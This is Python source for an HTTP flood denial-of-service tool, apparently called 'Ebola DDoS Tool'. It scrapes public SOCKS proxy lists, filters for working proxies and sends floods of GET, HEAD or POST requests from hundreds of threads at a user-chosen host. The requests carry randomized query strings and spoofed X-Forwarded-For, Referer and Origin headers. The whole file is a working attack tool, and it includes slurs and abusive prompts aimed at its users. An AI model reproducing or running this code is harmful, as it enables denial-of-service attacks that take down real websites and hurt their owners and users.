import socket, threading, sys, os, random, time, zipfile, ssl

try:
    import requests, socks, folium, IP2Location
    from colorama import Fore
except:
    os.system("pip3 install requests colorama pysocks")
    os.system("pip3 install folium")
    os.system("pip3 install IP2Location")

def clone_socks():
    f = open("socks5.txt","wb")
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",timeout=5)
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
        f.write(r.content)
    except:
        pass
    try:
        r = request.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
        f.write(r.content)
        f.close()
    except:
        f.close()
    g = open("socks4.txt","wb")
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=10000&country=all",timeout=5)
        g.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
        g.write(r.content)
    except:
        pass
    try:
        r = request.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
        g.write(r.content)
        g.close()
    except:
        g.close() 

useragents = []
string = ["id","q","a","s","page","result","search","login","user","nigga","ebola","hiv","covid","h1n1"]

nums = 0
suc = 0

print('\33]0;[%s] EbolaVirus\a'%(suc),end='')
os.system("clear")

print("""      ▓█████  ▄▄▄▄    ▒█████   ██▓    ▄▄▄    Ebola DDoS Tool Code By 413xPr06605.
3     ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓██▒   ▒████▄          Windows/Linux Supported Ver.
 1    ▒███   ▒██▒ ▄██▒██░  ██▒▒██░   ▒██  ▀█▄                 Socks4/5 Supported.
8 4   ▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██░   ░██▄▄▄▄██                 Version ~ # 1.2.3,
 2    ░▒████▒░▓█  ▀█▓░ ████▓▒░░██████▒▓█   ▓██▒     
  3   ░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▓  ░▒▒   ▓▒█░ 
      ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░ ░ ▒  ░ ▒   ▒▒ ░  [+] Add POST Header Origin
         ░    ░    ░ ░ ░ ░ ▒    ░ ░    ░   ▒    [+] Global Virus Map Supported,
        ░  ░ ░          ░ ░      ░  ░     ░  ░       
                    ░                           \n""")

socks_version = str(input("Socks Version (4/5) : "))
if socks_version =="4":
    ipfile = "socks4.txt"
else:
    ipfile = "socks5.txt"
if socks_version =="4" or socks_version =="5":
    pass
else:
    print("Only Accept 4 or 5\nGo Fuck Yourself Skid !")
    sys.exit()

clone_socks()


def GenUA():
    strNumber = random.ranint(0, 5000)
    return str(strNumber)

def flood(attack_type,host,port,path,x):
    if x < len(proxies):
        proxy = proxies[x].strip().split(":")
    else:
        proxy = random.choice(proxies).strip().split(":")
    useragent = useragents[x] + "\r\n"
    connection = "Connection: Keep-Alive:823\r\n"
    accept = "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\r\n"
    referer = "Referer: http://netsec-reborn.onion/ebola-virus?id="+host+"\r\n"
    fake_addr = "X-Forwarded-For: 1.0.0.1, "+proxy[0]+", 1.1.1.1\r\n"
    origin = "Origin: http://free-the-code.onion/ebola?virus=NS:Reborn-DDoS-Team" + "\r\n"
    if attack_type =="POST":
        content = "X-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"
        length = "Content-Length: 16\r\n\nEbola-Virus-DDoS\r\n\r\n"
    else:
        content = "\r"
        length = "\n"
    while 1:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            if socks_version =="5":
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            else:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            s.connect_ex((str(host), int(port)))
            if port ==443:
                s = ssl.wrap_socket(s)
            try:
                for _ in range(100):
                    http = attack_type + " " + path+"?"+random.choice(string)+"="+str(random.randint(880906,19990906))+"&"+random.choice(string)+"="+str(random.randint(880906,19990906))+ " HTTP/1.1\r\nHost: " + host + "\r\n"
                    if attack_type == "POST":
                        http = attack_type + " / HTTP/1.1\r\nHost: " + host + "\r\n"
                    request = http + useragent + connection + accept + referer + origin + fake_addr + content + length
                    s.send(str(request).encode())
                    s.send(str(request).encode())
                s.close()
                print("[%s:%s] %s Request -> %s"%(proxy[0],proxy[1],attack_type,host))
            except:
                s.close()
                proxy = random.choice(proxies).strip().split(":")
        except:
            s.close()
            proxy = random.choice(proxies).strip().split(":")   

def checking_socks(lines,):
    global nums
    global suc
    try:
        proxy = lines.strip().split(":")
        if socks_version =="5":
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
        else:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
    except:
        proxies.remove(lines)
        sys.stdout.write("NO\n")
        return
    err = 0
    while True:
        if err == 3:
            proxies.remove(lines)
            sys.stdout.write("NO\n")
            break
        try:
            s = socks.socksocket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            s.settimeout(5)
            s.connect((str(host), int(port)))
            s.send(str.encode("GET / HTTP/1.1\r\nHost: "+host+"\r\n\r\n"))
            s.close()
            suc +=1
            print('\33]0;[%s] EbolaVirus - Join\a'%(suc),end='')
            sys.stdout.write("YES\n")
            break
        except:
            s.close()
            err +=1
    nums += 1

def check_socks():
    global nums
    global suc
    thread_list=[]
    for lines in list(proxies):
        th = threading.Thread(target=checking_socks,args=(lines,))
        th.start()
        thread_list.append(th)
        time.sleep(0.01)
        sys.stdout.flush()
    for th in list(thread_list):
        th.join()
        sys.stdout.flush()
    with open(ipfile, 'wb') as fp:
        for lines in list(proxies):
            fp.write(bytes(lines,encoding='utf8'))
    fp.close()

def main():
    global proxies
    global host
    global port
    global socks_version
    attack_type = str(input("Choose (GET / HEAD / POST) : "))
    if attack_type =="GET" or attack_type =="HEAD" or attack_type =="POST":
        pass
    elif attack_type =="Get" or attack_type =="get":
        attack_type = "GET"
        pass
    elif attack_type =="Head" or attack_type =="head":
        attack_type = "HEAD"
        pass
    elif attack_type =="Post" or attack_type =="post":
        attack_type = "POST"
        pass
    else:
        print("Wrong Input , Go Fuck Yourself Skid !")
        sys.exit()
    host = str(input("Target [Host/Ip] : "))
    if host =="":
        print("Loss Value -> host\nGo Fuck Yourself Skid !")
        sys.exit()
    else:
        if host[0]+host[1]+host[2]+host[3] =="http":
            print("Don't Input http:// Or https://")
            sys.exit()
        if "192.168" in host or "127.0.0.1" in host or "local" in host:
            print("Invalid Host/Ip\nDamn Noob")
            sys.exit()
        if "gov" in host or "edu" in host:
            print("Don't Attack Any Gov Or Edu Site\nGo Fuck Yourself Noob Skid")
            sys.exit()
    port = str(input("Port [80/443] : "))
    if port =="":
        print("Set Default Port -> 80")
        port = 80
    else:
        port = int(port)
    path = str(input("Web Path (/) : "))
    if path =="":
        print("Set Default Path -> /")
        path = "/"
    else:
        path = path
        pass
    proxyfile = str(input("Proxy Filename (socks5.txt) : "))
    if proxyfile =="":
        if socks_version =="5":
            proxyfile = "socks5.txt"
        else:
            proxyfile = "socks4.txt"
    proxies = open(proxyfile).readlines()
    check = str(input("Check Socks Or Not (y/n) : "))
    if check =="y" or check == "Y":
        print("Waiting Ebola Virus Join Attack . . .")
        time.sleep(1)
        check_socks()
        print('\33]0;[%s] EbolaVirus - Standby\a'%(suc),end='')
    elif check =="n" or check =="N":
        pass
    elif check =="":
        print("Waiting Ebola Virus Join Attack . . .")
        time.sleep(1)
        check_socks()
        print('\33]0;[%s] EbolaVirus - Standby\a'%(suc),end='')
    thr = str(input("Threads [1-1500] : "))
    if thr =="":
        print("Set Default Threads -> 300")
        thr = 300
    else:
        thr = int(thr)
    print("User-Agent Creating . . .")
    for _ in range(thr):
        user_agent = GenUA()
        useragents.append(user_agent)
    time.sleep(1)
    for x in range(thr):
        threading.Thread(target=flood, args=(attack_type,host,port,path,x,)).start()

if __name__ == "__main__":
    main()
